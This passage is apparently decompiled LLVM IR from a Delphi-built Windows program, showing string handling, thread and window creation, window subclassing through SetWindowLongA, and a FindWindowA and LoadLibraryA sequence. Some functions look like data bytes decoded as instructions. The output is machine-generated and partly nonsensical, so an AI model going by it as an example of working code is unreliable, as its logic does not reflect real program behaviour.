  store i32 %59, i32* %esp.1.reg2mem, !insn.addr !1345
  br i1 %66, label %dec_label_pc_4065d1, label %dec_label_pc_4063da, !insn.addr !1345

dec_label_pc_4063da:                              ; preds = %dec_label_pc_4063c9
  %67 = call i32 @"@LStrFromPChar"(), !insn.addr !1346
  %68 = call i32 @function_4060f0(), !insn.addr !1347
  %69 = add i32 %esp.0.reload, -40, !insn.addr !1348
  %70 = inttoptr i32 %69 to i32*, !insn.addr !1348
  %71 = call i32 @"@LStrFromPChar"(), !insn.addr !1349
  %72 = call i32 @function_4060f0(), !insn.addr !1350
  %73 = add i32 %esp.0.reload, -44, !insn.addr !1351
  %74 = inttoptr i32 %73 to i32*, !insn.addr !1351
  %75 = load i32, i32* %stack_var_-4, align 4, !insn.addr !1352
  %76 = add i32 %esp.0.reload, -48, !insn.addr !1352
  %77 = inttoptr i32 %76 to i32*, !insn.addr !1352
  store i32 %75, i32* %77, align 4, !insn.addr !1352
  %78 = add i32 %esp.0.reload, -52, !insn.addr !1353
  %79 = inttoptr i32 %78 to i32*, !insn.addr !1353
  store i32 ptrtoint (i32* @global_var_406610 to i32), i32* %79, align 4, !insn.addr !1353
  %80 = load i32, i32* %stack_var_-8, align 4, !insn.addr !1354
  %81 = add i32 %esp.0.reload, -56, !insn.addr !1354
  %82 = inttoptr i32 %81 to i32*, !insn.addr !1354
  store i32 %80, i32* %82, align 4, !insn.addr !1354
  %83 = call i32 @"@LStrCatN"(), !insn.addr !1355
  %84 = add i32 %esp.0.reload, -60, !insn.addr !1356
  %85 = inttoptr i32 %84 to i32*, !insn.addr !1356
  %86 = add i32 %esp.0.reload, -64, !insn.addr !1357
  %87 = inttoptr i32 %86 to i32*, !insn.addr !1357
  store i32 4220444, i32* %87, align 4, !insn.addr !1357
  %88 = load i32, i32* %stack_var_-4, align 4, !insn.addr !1358
  %89 = add i32 %esp.0.reload, -68, !insn.addr !1358
  %90 = inttoptr i32 %89 to i32*, !insn.addr !1358
  store i32 %88, i32* %90, align 4, !insn.addr !1358
  %91 = add i32 %esp.0.reload, -72, !insn.addr !1359
  %92 = inttoptr i32 %91 to i32*, !insn.addr !1359
  store i32 4220460, i32* %92, align 4, !insn.addr !1359
  %93 = load i32, i32* %stack_var_-8, align 4, !insn.addr !1360
  %94 = add i32 %esp.0.reload, -76, !insn.addr !1360
  %95 = inttoptr i32 %94 to i32*, !insn.addr !1360
  store i32 %93, i32* %95, align 4, !insn.addr !1360
  %96 = add i32 %esp.0.reload, -80, !insn.addr !1361
  %97 = inttoptr i32 %96 to i32*, !insn.addr !1361
  store i32 4220476, i32* %97, align 4, !insn.addr !1361
  %98 = call i32 @function_407494(), !insn.addr !1362
  %99 = add i32 %esp.0.reload, -84, !insn.addr !1363
  %100 = inttoptr i32 %99 to i32*, !insn.addr !1363
  %101 = call i32 @"@LStrCatN"(), !insn.addr !1364
  %102 = add i32 %esp.0.reload, -88, !insn.addr !1365
  %103 = inttoptr i32 %102 to i32*, !insn.addr !1365
  %104 = add i32 %esp.0.reload, -92, !insn.addr !1366
  %105 = inttoptr i32 %104 to i32*
  %106 = ptrtoint i32* %stack_var_-40 to i32, !insn.addr !1366
  store i32 %106, i32* %105, align 4, !insn.addr !1366
  %107 = call i32 @"@LStrFromPChar"(), !insn.addr !1367
  %108 = call i32 @function_4060f0(), !insn.addr !1368
  %109 = call i32 @"@LStrPos"(), !insn.addr !1369
  %110 = add i32 %109, -1, !insn.addr !1370
  %111 = add i32 %esp.0.reload, -96, !insn.addr !1371
  %112 = inttoptr i32 %111 to i32*, !insn.addr !1371
  store i32 %110, i32* %112, align 4, !insn.addr !1371
  %113 = call i32 @"@LStrFromPChar"(), !insn.addr !1372
  %114 = call i32 @function_4060f0(), !insn.addr !1373
  %115 = call i32 @"@LStrCopy"(), !insn.addr !1374
  %116 = load i32, i32* %stack_var_-40, align 4, !insn.addr !1375
  store i32 %116, i32* %112, align 4, !insn.addr !1376
  %117 = call i32 @"@LStrFromPChar"(), !insn.addr !1377
  %118 = call i32 @function_4060f0(), !insn.addr !1378
  %119 = add i32 %esp.0.reload, -100, !insn.addr !1379
  %120 = inttoptr i32 %119 to i32*, !insn.addr !1379
  %121 = call i32 @"@LStrFromPChar"(), !insn.addr !1380
  %122 = call i32 @function_4060f0(), !insn.addr !1381
  %123 = call i32 @function_4057d0(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1382
  store i32* %105, i32** %.pre-phi.reg2mem, !insn.addr !1383
  store i32 %104, i32* %esp.1.reg2mem, !insn.addr !1383
  br label %dec_label_pc_4065d1, !insn.addr !1383

dec_label_pc_406509:                              ; preds = %dec_label_pc_406357
  %124 = call i32 @function_4034c8(), !insn.addr !1384
  %125 = icmp slt i32 %124, 5, !insn.addr !1385
  store i32* %60, i32** %.pre-phi.reg2mem, !insn.addr !1385
  store i32 %59, i32* %esp.1.reg2mem, !insn.addr !1385
  br i1 %125, label %dec_label_pc_4065d1, label %dec_label_pc_40651a, !insn.addr !1385

dec_label_pc_40651a:                              ; preds = %dec_label_pc_406509
  %126 = add i32 %esp.0.reload, -40, !insn.addr !1386
  %127 = inttoptr i32 %126 to i32*, !insn.addr !1386
  store i32 ptrtoint ([5 x i8]* @global_var_40665c to i32), i32* %127, align 4, !insn.addr !1386
  %128 = call i32 @function_404b20(), !insn.addr !1387
  %129 = add i32 %esp.0.reload, -44, !insn.addr !1388
  %130 = inttoptr i32 %129 to i32*, !insn.addr !1388
  %131 = add i32 %esp.0.reload, -48, !insn.addr !1389
  %132 = inttoptr i32 %131 to i32*, !insn.addr !1389
  store i32 ptrtoint ([7 x i8]* @global_var_40666c to i32), i32* %132, align 4, !insn.addr !1389
  %133 = call i32 @function_404b20(), !insn.addr !1390
  %134 = add i32 %esp.0.reload, -52, !insn.addr !1391
  %135 = inttoptr i32 %134 to i32*
  %136 = call i32 @"@LStrCatN"(), !insn.addr !1392
  %137 = add i32 %esp.0.reload, -56, !insn.addr !1393
  %138 = inttoptr i32 %137 to i32*, !insn.addr !1393
  %139 = call i32 @"@LStrFromPChar"(), !insn.addr !1394
  %140 = call i32 @function_4060f0(), !insn.addr !1395
  %141 = call i32 @function_404c78(), !insn.addr !1396
  store i32* %135, i32** %.pre-phi.reg2mem, !insn.addr !1397
  store i32 %134, i32* %esp.1.reg2mem, !insn.addr !1397
  br label %dec_label_pc_4065d1, !insn.addr !1397

dec_label_pc_406577:                              ; preds = %dec_label_pc_406357
  %142 = call i32 @function_4034c8(), !insn.addr !1398
  %143 = icmp slt i32 %142, 5, !insn.addr !1399
  store i32* %60, i32** %.pre-phi.reg2mem, !insn.addr !1399
  store i32 %59, i32* %esp.1.reg2mem, !insn.addr !1399
  br i1 %143, label %dec_label_pc_4065d1, label %dec_label_pc_406584, !insn.addr !1399

dec_label_pc_406584:                              ; preds = %dec_label_pc_406577
  %144 = add i32 %esp.0.reload, -40, !insn.addr !1400
  %145 = inttoptr i32 %144 to i32*, !insn.addr !1400
  store i32 ptrtoint ([5 x i8]* @global_var_40665c to i32), i32* %145, align 4, !insn.addr !1400
  %146 = call i32 @function_404b20(), !insn.addr !1401
  %147 = add i32 %esp.0.reload, -44, !insn.addr !1402
  %148 = inttoptr i32 %147 to i32*, !insn.addr !1402
  %149 = add i32 %esp.0.reload, -48, !insn.addr !1403
  %150 = inttoptr i32 %149 to i32*, !insn.addr !1403
  store i32 ptrtoint ([7 x i8]* @global_var_40666c to i32), i32* %150, align 4, !insn.addr !1403
  %151 = call i32 @function_404b20(), !insn.addr !1404
  %152 = add i32 %esp.0.reload, -52, !insn.addr !1405
  %153 = inttoptr i32 %152 to i32*
  %154 = call i32 @"@LStrCatN"(), !insn.addr !1406
  %155 = add i32 %esp.0.reload, -56, !insn.addr !1407
  %156 = inttoptr i32 %155 to i32*, !insn.addr !1407
  %157 = call i32 @function_4060f0(), !insn.addr !1408
  %158 = call i32 @function_404c78(), !insn.addr !1409
  store i32* %153, i32** %.pre-phi.reg2mem, !insn.addr !1409
  store i32 %152, i32* %esp.1.reg2mem, !insn.addr !1409
  br label %dec_label_pc_4065d1, !insn.addr !1409

dec_label_pc_4065d1:                              ; preds = %dec_label_pc_406357, %dec_label_pc_406584, %dec_label_pc_406577, %dec_label_pc_40651a, %dec_label_pc_406509, %dec_label_pc_4063da, %dec_label_pc_4063c9
  %159 = add i32 %esp.0.reload, -16, !insn.addr !1410
  %160 = inttoptr i32 %159 to i32*, !insn.addr !1410
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %.pre-phi.reload = load i32*, i32** %.pre-phi.reg2mem
  %161 = load i32, i32* %.pre-phi.reload, align 4, !insn.addr !1411
  call void @__writefsdword(i32 0, i32 %161), !insn.addr !1412
  %162 = add i32 %esp.1.reload, 8, !insn.addr !1413
  %163 = inttoptr i32 %162 to i32*, !insn.addr !1413
  store i32 4220403, i32* %163, align 4, !insn.addr !1413
  %164 = call i32 @"@LStrArrayClr"(), !insn.addr !1414
  ret i32 %164, !insn.addr !1415
}

define i32 @function_4065ec() local_unnamed_addr {
dec_label_pc_4065ec:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1416
  ret i32 %0, !insn.addr !1416
}

define i32 @function_4065f1() local_unnamed_addr {
dec_label_pc_4065f1:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1417
}

define i32 @function_4065f3(i32 %arg1) local_unnamed_addr {
dec_label_pc_4065f3:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1418
}

define i32 @function_40661f() local_unnamed_addr {
dec_label_pc_40661f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1419
}

define i32 @function_406627() local_unnamed_addr {
dec_label_pc_406627:
  %0 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %1 = add i32 %0, 1, !insn.addr !1420
  %2 = inttoptr i32 %0 to i32*, !insn.addr !1420
  store i32 %1, i32* %2, align 4, !insn.addr !1420
  %3 = bitcast i32* %eax to i8*
  %4 = load i8, i8* %3, align 4, !insn.addr !1421
  %5 = load i32, i32* %eax, align 4
  %6 = trunc i32 %5 to i8, !insn.addr !1421
  %7 = add i8 %4, %6, !insn.addr !1421
  %8 = inttoptr i32 %5 to i8*, !insn.addr !1421
  store i8 %7, i8* %8, align 1, !insn.addr !1421
  %9 = load i8, i8* %3, align 4, !insn.addr !1422
  %10 = load i32, i32* %eax, align 4
  %11 = udiv i32 %10, 256, !insn.addr !1422
  %12 = trunc i32 %11 to i8, !insn.addr !1422
  %13 = add i8 %9, %12, !insn.addr !1422
  %14 = inttoptr i32 %10 to i8*, !insn.addr !1422
  store i8 %13, i8* %14, align 1, !insn.addr !1422
  %15 = load i32, i32* %eax, align 4, !insn.addr !1423
  ret i32 %15, !insn.addr !1423
}

define i32 @function_40662e() local_unnamed_addr {
dec_label_pc_40662e:
  %0 = call i32 @function_40666c(), !insn.addr !1424
  ret i32 %0, !insn.addr !1424
}

define i32 @function_40666a() local_unnamed_addr {
dec_label_pc_40666a:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = trunc i32 %0 to i8
  %2 = mul i8 %1, 2, !insn.addr !1425
  %3 = inttoptr i32 %0 to i8*, !insn.addr !1425
  store i8 %2, i8* %3, align 1, !insn.addr !1425
  ret i32 %0, !insn.addr !1425
}

define i32 @function_40666c() local_unnamed_addr {
dec_label_pc_40666c:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i1 @__decompiler_undefined_function_1()
  %4 = call i1 @__decompiler_undefined_function_1()
  br i1 %3, label %dec_label_pc_4066d0, label %dec_label_pc_40666f, !insn.addr !1426

dec_label_pc_40666f:                              ; preds = %dec_label_pc_40666c
  %5 = icmp eq i1 %4, false, !insn.addr !1427
  br i1 %5, label %dec_label_pc_4066e4, label %dec_label_pc_406671, !insn.addr !1427

dec_label_pc_406671:                              ; preds = %dec_label_pc_40666f
  ret i32 %2, !insn.addr !1428

dec_label_pc_4066d0:                              ; preds = %dec_label_pc_40666c
  %6 = call i32 @function_4045ac(), !insn.addr !1429
  br label %dec_label_pc_4066e4, !insn.addr !1430

dec_label_pc_4066e4:                              ; preds = %dec_label_pc_4066d0, %dec_label_pc_40666f
  %7 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* null, i32 ptrtoint (i32* @0 to i32), i32 (i32*)* bitcast (i32* @0 to i32 (i32*)*), i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !1431
  %8 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* bitcast (i32* @0 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @0 to i32), i32 (i32*)* bitcast (i32* @0 to i32 (i32*)*), i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !1432
  %9 = add i32 %0, 20, !insn.addr !1433
  %10 = inttoptr i32 %9 to i32*, !insn.addr !1433
  %11 = load i32, i32* %10, align 4, !insn.addr !1433
  %12 = add i32 %0, 16, !insn.addr !1434
  %13 = inttoptr i32 %12 to i32*, !insn.addr !1434
  %14 = load i32, i32* %13, align 4, !insn.addr !1434
  %15 = add i32 %0, 8, !insn.addr !1435
  %16 = inttoptr i32 %15 to i32*, !insn.addr !1435
  %17 = load i32, i32* %16, align 4, !insn.addr !1435
  %18 = inttoptr i32 %11 to i32*, !insn.addr !1436
  %19 = call i32 @DefWindowProcA(i32* %18, i32 %14, i32 %1, i32 %17), !insn.addr !1436
  ret i32 %19, !insn.addr !1437
}

define i32 @function_40671c() local_unnamed_addr {
dec_label_pc_40671c:
  %0 = load i32 (i32, i32, i32)*, i32 (i32, i32, i32)** @global_var_409650, align 4
  %1 = ptrtoint i32 (i32, i32, i32)* %0 to i32
  %2 = call i32* @CreateWindowExA(i32 0, i8* null, i8* null, i32 0, i32 0, i32 0, i32 0, i32 %1, i32* null, i32* nonnull @0, i32* nonnull @0, i32* nonnull @0), !insn.addr !1438
  %3 = ptrtoint i32* %2 to i32, !insn.addr !1438
  %4 = call i32 @SetWindowLongA(i32* inttoptr (i32 4220576 to i32*), i32 -4, i32 %3), !insn.addr !1439
  ret i32 %4, !insn.addr !1440
}

define i32 @function_406751(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_406751:
  %merge7.reg2mem = alloca i32, !insn.addr !1441
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = trunc i32 %1 to i8
  %3 = mul i8 %2, 2, !insn.addr !1441
  %4 = inttoptr i32 %1 to i8*, !insn.addr !1441
  store i8 %3, i8* %4, align 1, !insn.addr !1441
  %5 = add i32 %1, 114, !insn.addr !1442
  %6 = inttoptr i32 %5 to i8*, !insn.addr !1442
  %7 = load i8, i8* %6, align 1, !insn.addr !1442
  %8 = udiv i32 %0, 256, !insn.addr !1442
  %9 = trunc i32 %8 to i8, !insn.addr !1442
  %10 = add i8 %7, %9, !insn.addr !1442
  store i8 %10, i8* %6, align 1, !insn.addr !1442
  %11 = add i8 %2, -32, !insn.addr !1443
  %12 = icmp ult i8 %2, 32, !insn.addr !1443
  %13 = icmp eq i8 %11, 0, !insn.addr !1443
  %14 = zext i8 %11 to i32, !insn.addr !1443
  %15 = and i32 %1, -256, !insn.addr !1443
  %16 = or i32 %15, %14, !insn.addr !1443
  %17 = or i1 %12, %13, !insn.addr !1444
  store i32 %16, i32* %merge7.reg2mem, !insn.addr !1444
  br i1 %17, label %dec_label_pc_40675a, label %dec_label_pc_4067ab, !insn.addr !1444

dec_label_pc_40675a:                              ; preds = %dec_label_pc_406751
  %18 = add i32 %16, 105, !insn.addr !1445
  %19 = inttoptr i32 %18 to i8*, !insn.addr !1445
  %20 = load i8, i8* %19, align 1, !insn.addr !1445
  %21 = and i8 %20, %9, !insn.addr !1445
  store i8 %21, i8* %19, align 1, !insn.addr !1445
  %22 = trunc i32 %arg3 to i16, !insn.addr !1446
  %23 = inttoptr i32 %arg6 to i8*, !insn.addr !1446
  %24 = load i8, i8* %23, align 1, !insn.addr !1446
  call void @__asm_outsb(i16 %22, i8 %24), !insn.addr !1446
  %25 = add i32 %arg5, 105, !insn.addr !1447
  %26 = and i32 %25, 65535
  %27 = inttoptr i32 %26 to i8*, !insn.addr !1447
  %28 = load i8, i8* %27, align 1, !insn.addr !1447
  %29 = udiv i32 %arg2, 256, !insn.addr !1447
  %30 = trunc i32 %29 to i8, !insn.addr !1447
  %31 = and i8 %28, %30, !insn.addr !1447
  store i8 %31, i8* %27, align 1, !insn.addr !1447
  %32 = mul i32 %arg5, 2, !insn.addr !1448
  %33 = add i32 %arg2, 115, !insn.addr !1448
  %34 = add i32 %33, %32, !insn.addr !1448
  %35 = inttoptr i32 %34 to i8*, !insn.addr !1448
  %36 = load i8, i8* %35, align 1, !insn.addr !1448
  %37 = trunc i32 %arg2 to i8, !insn.addr !1448
  %38 = add i8 %36, %37, !insn.addr !1448
  %39 = icmp eq i8 %38, 0, !insn.addr !1448
  store i8 %38, i8* %35, align 1, !insn.addr !1448
  store i32 %arg1, i32* %merge7.reg2mem, !insn.addr !1449
  br i1 %39, label %dec_label_pc_4067ab, label %dec_label_pc_406769, !insn.addr !1449

dec_label_pc_406769:                              ; preds = %dec_label_pc_40675a
  %40 = inttoptr i32 %arg6 to i32*, !insn.addr !1450
  %41 = load i32, i32* %40, align 4, !insn.addr !1450
  call void @__asm_outsd(i16 %22, i32 %41), !insn.addr !1450
  %42 = inttoptr i32 %arg5 to i8*, !insn.addr !1451
  %43 = call i32* @FindWindowA(i8* %42, i8* bitcast (i32* @0 to i8*)), !insn.addr !1451
  %44 = ptrtoint i32* %43 to i32, !insn.addr !1451
  %45 = icmp eq i32* %43, null, !insn.addr !1452
  %46 = icmp eq i1 %45, false, !insn.addr !1453
  store i32 %44, i32* %merge7.reg2mem, !insn.addr !1453
  br i1 %46, label %dec_label_pc_4067ab, label %dec_label_pc_40678d, !insn.addr !1453

dec_label_pc_40678d:                              ; preds = %dec_label_pc_406769
  %47 = call i32 @function_40671c(), !insn.addr !1454
  %48 = call i32 @function_4036c8(), !insn.addr !1455
  %49 = inttoptr i32 %48 to i8*, !insn.addr !1456
  %50 = call i32* @LoadLibraryA(i8* %49), !insn.addr !1457
  %51 = ptrtoint i32* %50 to i32, !insn.addr !1457
  ret i32 %51, !insn.addr !1458

dec_label_pc_4067ab:                              ; preds = %dec_label_pc_406751, %dec_label_pc_406769, %dec_label_pc_40675a
  %merge7.reload = load i32, i32* %merge7.reg2mem
  ret i32 %merge7.reload, !insn.addr !1459
}

define i32 @function_406871(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_406871:
  %esp.0.in.reg2mem = alloca i32*, !insn.addr !1460
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_32 = alloca i32, align 4
  %stack_var_28 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_28, align 4
  %stack_var_16 = alloca i32, align 4
  store i32 %arg4, i32* %stack_var_16, align 4
  %5 = bitcast i32* %eax to i8*
  %6 = load i8, i8* %5, align 4, !insn.addr !1460
  %7 = load i32, i32* %eax, align 4
  %8 = trunc i32 %7 to i8, !insn.addr !1460
  %9 = add i8 %6, %8, !insn.addr !1460
  %10 = inttoptr i32 %7 to i8*, !insn.addr !1460
  store i8 %9, i8* %10, align 1, !insn.addr !1460
  %11 = load i32, i32* %eax, align 4, !insn.addr !1461
  %12 = add i32 %11, 114, !insn.addr !1461
  %13 = inttoptr i32 %12 to i8*, !insn.addr !1461
  %14 = load i8, i8* %13, align 1, !insn.addr !1461
  %15 = udiv i32 %2, 256, !insn.addr !1461
  %16 = trunc i32 %15 to i8, !insn.addr !1461
  %17 = add i8 %14, %16, !insn.addr !1461
  store i8 %17, i8* %13, align 1, !insn.addr !1461
  %18 = load i32, i32* %eax, align 4
  %19 = trunc i32 %18 to i8, !insn.addr !1462
  %20 = add i8 %19, -32, !insn.addr !1462
  %21 = icmp ult i8 %19, 32, !insn.addr !1462
  %22 = icmp eq i8 %20, 0, !insn.addr !1462
  %23 = zext i8 %20 to i32, !insn.addr !1462
  %24 = and i32 %18, -256, !insn.addr !1462
  %25 = or i32 %24, %23, !insn.addr !1462
  store i32 %25, i32* %eax, align 4, !insn.addr !1462
  %26 = or i1 %21, %22, !insn.addr !1463
  br i1 %26, label %dec_label_pc_40687a, label %dec_label_pc_4068e9, !insn.addr !1463

dec_label_pc_40687a:                              ; preds = %dec_label_pc_406871
  %27 = add i32 %25, 105, !insn.addr !1464
  %28 = inttoptr i32 %27 to i8*, !insn.addr !1464
  %29 = load i8, i8* %28, align 1, !insn.addr !1464
  %30 = and i8 %29, %16, !insn.addr !1464
  store i8 %30, i8* %28, align 1, !insn.addr !1464
  %31 = load i32, i32* %stack_var_28, align 4, !insn.addr !1465
  store i32 %31, i32* %eax, align 4, !insn.addr !1465
  %32 = trunc i32 %arg3 to i16, !insn.addr !1466
  %33 = inttoptr i32 %arg6 to i8*, !insn.addr !1466
  %34 = load i8, i8* %33, align 1, !insn.addr !1466
  call void @__asm_outsb(i16 %32, i8 %34), !insn.addr !1466
  %35 = add i32 %arg5, 105, !insn.addr !1467
  %36 = and i32 %35, 65535
  %37 = inttoptr i32 %36 to i8*, !insn.addr !1467
  %38 = load i8, i8* %37, align 1, !insn.addr !1467
  %39 = udiv i32 %arg2, 256, !insn.addr !1467
  %40 = trunc i32 %39 to i8, !insn.addr !1467
  %41 = and i8 %38, %40, !insn.addr !1467
  store i8 %41, i8* %37, align 1, !insn.addr !1467
  %42 = mul i32 %arg5, 2, !insn.addr !1468
  %43 = add i32 %arg2, 115, !insn.addr !1468
  %44 = add i32 %43, %42, !insn.addr !1468
  %45 = inttoptr i32 %44 to i8*, !insn.addr !1468
  %46 = load i8, i8* %45, align 1, !insn.addr !1468
  %47 = trunc i32 %arg2 to i8, !insn.addr !1468
  %48 = add i8 %46, %47, !insn.addr !1468
  %49 = icmp eq i8 %48, 0, !insn.addr !1468
  store i8 %48, i8* %45, align 1, !insn.addr !1468
  store i32* %stack_var_32, i32** %esp.0.in.reg2mem, !insn.addr !1469
  br i1 %49, label %dec_label_pc_4068cb, label %dec_label_pc_406889, !insn.addr !1469

dec_label_pc_406889:                              ; preds = %dec_label_pc_40687a
  %50 = icmp slt i8 %48, 0, !insn.addr !1468
  %51 = inttoptr i32 %arg6 to i32*, !insn.addr !1470
  %52 = load i32, i32* %51, align 4, !insn.addr !1470
  call void @__asm_outsd(i16 %32, i32 %52), !insn.addr !1470
  br i1 %50, label %dec_label_pc_406900, label %dec_label_pc_40688e, !insn.addr !1471

dec_label_pc_40688e:                              ; preds = %dec_label_pc_406889
  %53 = load i32, i32* %eax, align 4
  %54 = trunc i32 %53 to i8, !insn.addr !1472
  %55 = add i8 %54, -32, !insn.addr !1472
  %56 = icmp ult i8 %54, 32, !insn.addr !1472
  %57 = icmp eq i8 %55, 0, !insn.addr !1472
  %58 = zext i8 %55 to i32, !insn.addr !1472
  %59 = and i32 %53, -256, !insn.addr !1472
  %60 = or i32 %59, %58, !insn.addr !1472
  store i32 %60, i32* %eax, align 4, !insn.addr !1472
  %61 = or i1 %56, %57, !insn.addr !1473
  br i1 %61, label %dec_label_pc_406892, label %dec_label_pc_406901, !insn.addr !1473

dec_label_pc_406892:                              ; preds = %dec_label_pc_40688e
  %62 = add i32 %arg2, 105, !insn.addr !1474
  %63 = inttoptr i32 %62 to i8*, !insn.addr !1474
  %64 = load i8, i8* %63, align 1, !insn.addr !1474
  %65 = udiv i32 %53, 256, !insn.addr !1474
  %66 = trunc i32 %65 to i8, !insn.addr !1474
  %67 = and i8 %64, %66, !insn.addr !1474
  store i8 %67, i8* %63, align 1, !insn.addr !1474
  %68 = add i32 %arg6, 105, !insn.addr !1475
  %69 = inttoptr i32 %68 to i8*, !insn.addr !1475
  %70 = load i8, i8* %69, align 1, !insn.addr !1475
  %71 = and i8 %70, %40, !insn.addr !1475
  store i8 %71, i8* %69, align 1, !insn.addr !1475
  %72 = load i32, i32* %eax, align 4
  %73 = inttoptr i32 %72 to i8*, !insn.addr !1476
  %74 = load i8, i8* %73, align 1, !insn.addr !1476
  %75 = trunc i32 %72 to i8, !insn.addr !1476
  %76 = add i8 %74, %75, !insn.addr !1476
  store i8 %76, i8* %73, align 1, !insn.addr !1476
  %77 = load i32, i32* %eax, align 4
  %78 = inttoptr i32 %77 to i8*, !insn.addr !1477
  %79 = load i8, i8* %78, align 1, !insn.addr !1477
  %80 = trunc i32 %77 to i8, !insn.addr !1477
  %81 = add i8 %79, %80, !insn.addr !1477
  store i8 %81, i8* %78, align 1, !insn.addr !1477
  %82 = inttoptr i32 %arg2 to i32*, !insn.addr !1478
  %83 = load i32, i32* %82, align 4, !insn.addr !1478
  %84 = add i32 %83, %arg6, !insn.addr !1478
  store i32 %84, i32* %82, align 4, !insn.addr !1478
  %85 = load i32, i32* %eax, align 4
  %86 = inttoptr i32 %85 to i8*, !insn.addr !1479
  %87 = load i8, i8* %86, align 1, !insn.addr !1479
  %88 = trunc i32 %85 to i8, !insn.addr !1479
  %89 = add i8 %87, %88, !insn.addr !1479
  store i8 %89, i8* %86, align 1, !insn.addr !1479
  store i32 %arg5, i32* %stack_var_28, align 4, !insn.addr !1480
  %90 = call i32 @__readfsdword(i32 0), !insn.addr !1481
  store i32 %90, i32* %stack_var_16, align 4, !insn.addr !1481
  %91 = ptrtoint i32* %stack_var_16 to i32, !insn.addr !1481
  call void @__writefsdword(i32 0, i32 %91), !insn.addr !1482
  %92 = load i32, i32* @global_var_4096d4, align 4, !insn.addr !1483
  %93 = add i32 %92, 1, !insn.addr !1483
  %94 = icmp eq i32 %93, 0, !insn.addr !1483
  store i32 %93, i32* @global_var_4096d4, align 4, !insn.addr !1483
  %95 = icmp eq i1 %94, false, !insn.addr !1484
  br i1 %95, label %dec_label_pc_4068c3, label %dec_label_pc_4068b9, !insn.addr !1484

dec_label_pc_4068b9:                              ; preds = %dec_label_pc_406892
  %96 = call i32 @"@LStrClr"(), !insn.addr !1485
  br label %dec_label_pc_4068c3, !insn.addr !1485

dec_label_pc_4068c3:                              ; preds = %dec_label_pc_4068b9, %dec_label_pc_406892
  store i32 0, i32* %eax, align 4, !insn.addr !1486
  %97 = load i32, i32* %stack_var_16, align 4, !insn.addr !1487
  call void @__writefsdword(i32 0, i32 %97), !insn.addr !1488
  store i32* %stack_var_28, i32** %esp.0.in.reg2mem, !insn.addr !1488
  br label %dec_label_pc_4068cb, !insn.addr !1488

dec_label_pc_4068cb:                              ; preds = %dec_label_pc_4068c3, %dec_label_pc_40687a
  %esp.0.in.reload = load i32*, i32** %esp.0.in.reg2mem
  %esp.0 = ptrtoint i32* %esp.0.in.reload to i32
  %98 = add i32 %esp.0, -4, !insn.addr !1489
  %99 = inttoptr i32 %98 to i32*, !insn.addr !1489
  store i32 4221144, i32* %99, align 4, !insn.addr !1489
  %100 = load i32, i32* %eax, align 4, !insn.addr !1490
  ret i32 %100, !insn.addr !1490

dec_label_pc_4068e9:                              ; preds = %dec_label_pc_406871
  %101 = mul i32 %4, 2, !insn.addr !1491
  %102 = add i32 %1, 105, !insn.addr !1491
  %103 = add i32 %102, %101, !insn.addr !1491
  %104 = inttoptr i32 %103 to i32*, !insn.addr !1491
  %105 = load i32, i32* %104, align 4, !insn.addr !1491
  %106 = or i32 %105, %3, !insn.addr !1491
  store i32 %106, i32* %104, align 4, !insn.addr !1491
  %107 = add i32 %0, -1, !insn.addr !1492
  %108 = trunc i32 %3 to i16, !insn.addr !1493
  %109 = inttoptr i32 %107 to i32*, !insn.addr !1493
  %110 = load i32, i32* %109, align 4, !insn.addr !1493
  call void @__asm_outsd(i16 %108, i32 %110), !insn.addr !1493
  %111 = load i32, i32* %eax, align 4, !insn.addr !1494
  %112 = call i8 @__readgsbyte(i32 %111), !insn.addr !1494
  %113 = load i32, i32* %eax, align 4
  %114 = trunc i32 %113 to i8, !insn.addr !1494
  %115 = or i8 %112, %114, !insn.addr !1494
  call void @__writegsbyte(i32 %113, i8 %115), !insn.addr !1494
  %116 = load i32, i32* %eax, align 4
  %117 = inttoptr i32 %116 to i8*, !insn.addr !1495
  %118 = load i8, i8* %117, align 1, !insn.addr !1495
  %119 = trunc i32 %116 to i8, !insn.addr !1495
  %120 = add i8 %118, %119, !insn.addr !1495
  store i8 %120, i8* %117, align 1, !insn.addr !1495
  %121 = load i32, i32* %eax, align 4
  %122 = trunc i32 %121 to i8, !insn.addr !1496
  %123 = inttoptr i32 %121 to i8*, !insn.addr !1496
  %124 = load i8, i8* %123, align 1, !insn.addr !1496
  %125 = add i8 %124, %122, !insn.addr !1496
  %126 = zext i8 %125 to i32, !insn.addr !1496
  %127 = and i32 %121, -256, !insn.addr !1496
  %128 = or i32 %127, %126, !insn.addr !1496
  %129 = inttoptr i32 %128 to i8*, !insn.addr !1497
  %130 = load i8, i8* %129, align 1, !insn.addr !1497
  %131 = trunc i32 %3 to i8, !insn.addr !1498
  %132 = add i8 %125, %131, !insn.addr !1497
